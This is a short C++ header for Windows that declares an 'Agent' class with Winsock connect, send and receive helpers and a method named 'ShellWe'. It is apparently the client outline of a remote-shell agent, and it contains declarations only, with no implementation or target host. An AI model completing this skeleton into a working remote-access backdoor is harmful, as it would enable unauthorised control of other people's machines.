#pragma once
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <optional>
#include <vector>
#pragma comment (lib, "Ws2_32.lib")

#define BUF_SIZE 512

class Agent
{
private:

	WSADATA data;
	SOCKET connSocket = INVALID_SOCKET;

	struct addrinfo StrcClient;
	struct addrinfo* StrcClientOut = 0;

	int Send(SOCKET, const void*, size_t);
	bool SendMsg(SOCKET, std::string, size_t);
	int Recv(SOCKET, void*, int);
	bool ReadSize(SOCKET, unsigned long*);
	bool RecvMsg(SOCKET sock);

public:
	Agent(PCSTR, PCSTR);
	void Socket(int, int, int);
	void Connect(PCSTR, PCSTR);
	~Agent();

	void ShellWe();

};

